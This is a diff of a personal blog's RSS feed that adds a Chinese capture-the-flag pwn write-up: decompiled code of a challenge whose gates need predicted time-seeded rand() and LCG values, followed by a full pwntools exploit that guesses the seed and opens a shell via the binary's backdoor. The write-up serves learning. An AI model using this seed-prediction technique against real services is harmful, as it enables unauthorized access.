@@ -1,4 +1,242 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe3/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe3/</guid><description>可能这是真的第一次写pwn很舒服吧</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;题外话&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe4/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe4/</guid><description>我好困，好困。。。。。</description><pubDate>Fri, 11 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;等一下就要回家了，所以今天大概率就更一篇吧，还有这个食蜂好好看&lt;/p&gt;
+&lt;h1&gt;兰斯先生的秘密&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有canary+PIE,要泄露这俩&lt;/p&gt;
+&lt;p&gt;看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  unsigned int v5; // [rsp+Ch] [rbp-4h]
+
+  init(argc, argv, envp);
+  puts(&quot;Do you want to know srand&apos;s secret?&quot;);
+  puts(&quot;You have to enter 3 gates which tests your abilities!&quot;);
+  puts(&quot;But the key is *predict*. I guess no one can solve them. Hiahia!&quot;);
+  v3 = gate1();
+  v5 = gate2(v3);
+  gate3(v5);
+  puts(&quot;All gates passed!&quot;);
+  b4ckdo0r();
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;很直白啊，过了三关就给后门&lt;/p&gt;
+&lt;p&gt;第一关&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 gate1()
+{
+  int v1; // [rsp+Ch] [rbp-14h] BYREF
+  unsigned int seed; // [rsp+10h] [rbp-10h]
+  int v3; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 1: Predict TIME&quot;);
+  puts(&quot;==============================&quot;);
+  seed = time(0);
+  srand(seed);
+  v3 = rand();
+  printf(&quot;Password:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v1);
+  if ( v3 != v1 )
+  {
+    puts(&quot;You can&apos;t predict the time easily!&quot;);
+    exit(0);
+  }
+  puts(&quot;You&apos;ve beaten the time and become a stronger self!&quot;);
+  return seed;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;时间管理大师，造一个伪随机应该可以结束战斗&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall gate2(unsigned int a1)
+{
+  int v2; // [rsp+1Ch] [rbp-14h] BYREF
+  unsigned int v3; // [rsp+20h] [rbp-10h]
+  int i; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 2: Predict calculation&quot;);
+  puts(&quot;==============================&quot;);
+  v3 = a1;
+  for ( i = 0; i &amp;lt;= 114513; ++i )
+    v3 = lcg(v3);
+  printf(&quot;Password:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v2);
+  if ( v3 != v2 )
+  {
+    puts(&quot;Well, it seems you don&apos;t know... Maybe you can learn about LCG?&quot;);
+    exit(0);
+  }
+  puts(&quot;Good job! That&apos;s one of the ways how random number works.&quot;);
+  return v3;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第一轮的seed传递到第二轮，进行114514次lcg&lt;/p&gt;
+&lt;p&gt;然后输入比较，最后把处理后的值传递出来&lt;/p&gt;
+&lt;p&gt;第三轮则是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall gate3(unsigned int a1)
+{
+  int v2; // [rsp+18h] [rbp-18h] BYREF
+  int v3; // [rsp+1Ch] [rbp-14h]
+  int v4; // [rsp+20h] [rbp-10h]
+  unsigned int v5; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 3: Predict unknown&quot;);
+  puts(&quot;==============================&quot;);
+  srand(a1);
+  v3 = rand();
+  v4 = rand();
+  v5 = rand();
+  printf(&quot;First random number:%u\n&quot;, v3);
+  printf(&quot;Second random number:%u\n&quot;, v4);
+  printf(&quot;Your answer:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v2);
+  if ( v5 != v2 )
+  {
+    puts(&quot;Haha...It&apos;s random, how can you predict it?&quot;);
+    exit(0);
+  }
+  puts(&quot;Wow, random number is in fact not random,right?&quot;);
+  return v5;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;已处理后的值作为基准及逆行三次随机，然后比较产生的最后一个随机数成功就能结束战斗了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int b4ckdo0r()
+{
+  puts(&quot;Genius!&quot;);
+  puts(&quot;You defeated all random gates! Here is your bonus:&quot;);
+  return system(&quot;/bin/sh&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;很朴实的后门&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;扣了半小时手机我决定继续战斗&lt;/s&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;程序启动时的 &lt;code&gt;time(0)&lt;/code&gt; 通常与攻击者当前时间非常接近（网络延迟一般 0~3 秒）。因此可以枚举当前时间前后几秒作为候选种子：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;current = int(time.time())
+for delta in range(-5, 6):   # 尝试 ±5 秒
+   seed = current + delta
+   # 用这个种子生成随机数
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;那怎么自己造一个随机数呢&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;ctypes 调用 libc 的 srand/rand&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;libc直接用我自己的得了&lt;/p&gt;
+&lt;p&gt;然后是lcg的问题&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def lcg(a1):
+    return (1103515245 * a1 + 12345) &amp;amp; 0x7FFFFFFF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;标准的我直接照抄就好了&lt;/p&gt;
+&lt;p&gt;ok，现在陈述一下大致的攻击思路&lt;/p&gt;
+&lt;p&gt;第一阶段直接用time(0)直接生成的rand作为校验，第二轮把第一轮生成的数字进行114514次lcg，第三轮再生成三个随机数，取第三个校验即可&lt;/p&gt;
+&lt;p&gt;抖动机制讲解&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;程序用 &lt;code&gt;seed = time(0); srand(seed);&lt;/code&gt; 生成随机数。
+&lt;code&gt;time(0)&lt;/code&gt; 返回的是&lt;strong&gt;秒级时间戳&lt;/strong&gt;。你在本地脚本中获取的 &lt;code&gt;current = int(time.time())&lt;/code&gt; 和远程程序实际执行 &lt;code&gt;time(0)&lt;/code&gt; 的时刻，可能不在同一秒内，原因包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;网络延迟&lt;/strong&gt;：你发送连接、数据到达服务器、服务器启动程序都需要时间。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器处理时间&lt;/strong&gt;：程序初始化、等待输入等消耗时间。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时钟偏差&lt;/strong&gt;：本地与服务器系统时钟可能有微小差异。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时区无关&lt;/strong&gt;：&lt;code&gt;time(0)&lt;/code&gt; 返回 UTC 时间戳，但本地时钟若不准也会影响。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此，远程程序实际使用的种子可能是 &lt;code&gt;current - 2&lt;/code&gt;、&lt;code&gt;current - 1&lt;/code&gt;、&lt;code&gt;current&lt;/code&gt;、&lt;code&gt;current + 1&lt;/code&gt;、&lt;code&gt;current + 2&lt;/code&gt; 中的某一个。枚举 &lt;code&gt;range(-2, 3)&lt;/code&gt; 就是覆盖这 5 个可能的种子。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;for delta in range(-2, 3):
+    seed = current + delta          # 猜测种子
+    ans1 = predict_gate1(seed)      # 用该种子预测 Gate1 需要的随机数
+    p.recvuntil(b&apos;Password:&apos;)       # 等待提示
+    p.sendline(str(ans1).encode())  # 发送预测值
+    resp = p.recvline()             # 读取响应
+    if b&apos;beaten&apos; in resp or b&apos;stronger&apos; in resp:
+        seed1 = seed                # 通过，记录正确的种子
+        break
+    p.close()                       # 失败，关闭连接
+    p = start(host, port)           # 重新连接（因为程序失败会退出）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;exp(0x7FFFFFFFF防坠机)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+import ctypes
+import time
+
+try:
+    libc = ctypes.CDLL(&apos;./libc.so.6&apos;)
+except OSError:
+    libc = ctypes.CDLL(None)
+
+def lcg(a1):
+    return (1103515245 * a1 + 12345) &amp;amp; 0x7FFFFFFF
+
+def predict_gate1(seed):
+    libc.srand(seed)
+    return libc.rand() &amp;amp; 0x7fffffff
+
+def predict_gate2(seed):
+    v = seed
+    for _ in range(114514):
+        v = lcg(v)
+    return v
+
+def predict_gate3(seed):
+    libc.srand(seed)
+    libc.rand()
+    libc.rand()
+    return libc.rand() &amp;amp; 0x7fffffff
+
+def start(host, port):
+    return remote(host, port) if args.REMOTE else process(&apos;./pwn&apos;)
+
+def solve(host, port):
+    p = start(host, port)
+    current = int(time.time())
+    seed1 = None
+
+    for delta in range(-2, 3):
+        seed = current + delta
+        ans1 = predict_gate1(seed)
+        p.recvuntil(b&apos;Password:&apos;)
+        p.sendline(str(ans1).encode())
+        resp = p.recvline()
+        if b&apos;beaten&apos; in resp or b&apos;stronger&apos; in resp:
+            seed1 = seed
+            break
+        p.close()
+        p = start(host, port)
+
+    if seed1 is None:
+        return
+
+    ans2 = predict_gate2(seed1)
+    p.recvuntil(b&apos;Password:&apos;)
+    p.sendline(str(ans2).encode())
+    p.recvline()
+
+    ans3 = predict_gate3(ans2)
+    p.recvuntil(b&apos;Your answer:&apos;)
+    p.sendline(str(ans3).encode())
+    p.recvline()
+
+    p.interactive()
+
+if __name__ == &apos;__main__&apos;:
+    solve(&apos;127.0.0.1&apos;, 57639)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;搞了一中午机械臂，下午信号与系统一点都听不进去，幸好提前听了第一节课&lt;/p&gt;
+&lt;p&gt;PS:信号与系统上写WP真苏轼啊&lt;/p&gt;
+</content:encoded></item><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe3/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe3/</guid><description>可能这是真的第一次写pwn很舒服吧</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;题外话&lt;/h1&gt;
 &lt;p&gt;现在我做封面的技术真的是炉火纯青了&lt;/p&gt;
 &lt;p&gt;听v我写的进度很慢，听方大同写的速度就很快&lt;/p&gt;
 &lt;p&gt;所以拜拜，洛小妹&lt;/p&gt;
